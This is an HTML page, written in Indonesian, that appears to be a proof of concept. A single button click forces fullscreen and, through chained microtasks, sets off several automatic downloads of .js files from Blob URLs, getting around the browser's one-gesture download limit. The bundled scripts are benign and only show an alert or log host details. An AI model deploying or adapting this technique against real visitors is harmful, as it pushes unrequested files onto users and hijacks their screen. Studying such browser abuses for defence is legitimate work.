<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Blob ObjectURL — Race Condition .JS</title>
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
}
body {
font-family: Arial, sans-serif;
background: #f4f6f8;
color: #222;
padding: 20px;
}
.panel {
background: #ffffff;
padding: 24px;
border-radius: 12px;
box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
max-width: 600px;
margin: 40px auto;
}
:fullscreen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
width: 100vw !important;
height: 100vh !important;
}
:-webkit-full-screen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
}
h2 {
margin-bottom: 10px;
}
p {
margin-bottom: 15px;
line-height: 1.5;
}
button {
width: 100%;
padding: 16px;
cursor: pointer;
border: none;
border-radius: 6px;
background: #d32f2f;
color: #ffffff;
font-weight: bold;
font-size: 16px;
box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
transition: background 0.2s;
}
button:hover {
background: #b71c1c;
}
button:disabled {
background: #9e9e9e;
cursor: not-allowed;
}
#status {
margin-top: 16px;
font-weight: bold;
color: #d32f2f;
padding: 12px;
background: #ffebee;
border-radius: 6px;
text-align: center;
border: 1px solid #ffcdd2;
}
#counter {
margin-top: 12px;
font-family: monospace;
font-size: 14px;
text-align: center;
color: #555;
}
#downloads {
margin-top: 20px;
display: grid;
grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
gap: 10px;
}
#downloads a {
display: block;
padding: 8px;
background: #212121;
color: #80df82;
text-decoration: none;
border-radius: 4px;
font-size: 12px;
text-align: center;
border: 1px solid #424242;
word-break: break-all;
}
</style>
</head>
<body>

<div class="panel" id="main-panel">
<h2>Blob ObjectURL — Race Condition .JS</h2>
<p>Satu klik tombol = satu gesture user. Race condition memakai microtask scheduling agar browser menganggap semua unduhan berasal dari gesture yang sama, sehingga memicu beberapa berkas <code>.js</code> sekaligus dari Blob ObjectURL.</p>
<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Download .JS</button>
<div id="status" role="status">Sistem siap.</div>
<div id="counter">Unduhan dipicu: 0</div>
<div id="downloads"></div>
</div>

<script>
var startBtn = document.getElementById("start-btn");
var statusDiv = document.getElementById("status");
var downloadsDiv = document.getElementById("downloads");
var counterDiv = document.getElementById("counter");

var activeUrls = [];
var isProcessing = false;
var totalTarget = 5;

var speak = function(message) {
if ('speechSynthesis' in window) {
try {
window.speechSynthesis.cancel();
var utterance = new SpeechSynthesisUtterance(message);
utterance.lang = 'id-ID';
utterance.rate = 1.0;
window.speechSynthesis.speak(utterance);
} catch (e) {
console.warn("TTS gagal:", e);
}
}
};

var payloadJs = "// ============================================\n" +
"// Payload JS — hasil Blob ObjectURL race condition\n" +
"// ============================================\n" +
"\n" +
"(function() {\n" +
"    'use strict';\n" +
"    var info = {\n" +
"        origin: (typeof window !== 'undefined') ? (window.location.origin || 'null') : 'node',\n" +
"        href: (typeof window !== 'undefined') ? window.location.href : 'node',\n" +
"        waktu: new Date().toISOString(),\n" +
"        ua: (typeof navigator !== 'undefined') ? navigator.userAgent : 'node'\n" +
"    };\n" +
"    console.log('[Payload JS] Aktif:', info);\n" +
"    try {\n" +
"        if (typeof alert !== 'undefined') {\n" +
"            alert('Payload JS aktif! Origin: ' + info.origin);\n" +
"        }\n" +
"    } catch (e) {\n" +
"        console.warn('alert diblokir:', e.message);\n" +
"    }\n" +
"    if (typeof window !== 'undefined') {\n" +
"        window.__payloadInfo = info;\n" +
"    }\n" +
"})();\n";

var payloadJsModul = "// Modul Node.js — payload race condition\n" +
"'use strict';\n" +
"\n" +
"const os = require('os');\n" +
"\n" +
"module.exports = {\n" +
"    nama: 'race-payload',\n" +
"    versi: '1.0.0',\n" +
"    hostname: () => os.hostname(),\n" +
"    platform: () => process.platform,\n" +
"    waktu: () => new Date().toISOString()\n" +
"};\n" +
"\n" +
"console.log('[Modul] Dimuat:', new Date().toISOString());\n";

function buatBlobUrlJs(id) {
var isi = (id % 2 === 0) ? payloadJsModul : payloadJs;
var blob = new Blob([isi], { type: "application/javascript" });
var url = URL.createObjectURL(blob);
activeUrls.push(url);
return url;
}

function triggerDownload(url, id, label) {
var a = document.createElement("a");
a.href = url;
a.download = "race-script-" + String(id).padStart(3, '0') + ".js";
a.textContent = label;
a.style.display = "none";
downloadsDiv.appendChild(a);
a.click();
}

function updateCounter(n) {
counterDiv.textContent = "Unduhan dipicu: " + n;
}

function masukFullscreen() {
var root = document.documentElement;
try {
if (root.requestFullscreen) {
var p = root.requestFullscreen();
if (p && p.catch) p.catch(function() {});
} else if (root.webkitRequestFullscreen) {
root.webkitRequestFullscreen();
} else if (root.mozRequestFullScreen) {
root.mozRequestFullScreen();
}
} catch (err) {
console.warn("Fullscreen gagal:", err);
}
}

function jalankanRaceCondition() {
if (isProcessing) return;
isProcessing = true;

activeUrls.forEach(function(u) { URL.revokeObjectURL(u); });
activeUrls = [];
downloadsDiv.replaceChildren();
updateCounter(0);

statusDiv.textContent = "Memicu race condition .JS...";

masukFullscreen();

var dipicu = 0;

function picuSatu() {
if (dipicu >= totalTarget) {
statusDiv.textContent = "Selesai. " + dipicu + " berkas .JS dipicu dari 1 klik.";
isProcessing = false;
startBtn.disabled = false;
speak("Race condition selesai. " + dipicu + " berkas js dipicu.");
return;
}
dipicu++;
var url = buatBlobUrlJs(dipicu);
triggerDownload(url, dipicu, "Race .JS #" + dipicu);
updateCounter(dipicu);
statusDiv.textContent = "Memproses .JS ke-" + dipicu + " dari " + totalTarget;
queueMicrotask(picuSatu);
}

queueMicrotask(function() {
queueMicrotask(function() {
queueMicrotask(function() {
picuSatu();
});
});
});
}

startBtn.addEventListener("click", function() {
if (isProcessing) return;
startBtn.disabled = true;
speak("Memulai race condition berkas js.");
jalankanRaceCondition();
});

updateCounter(0);
</script>

</body>
</html>
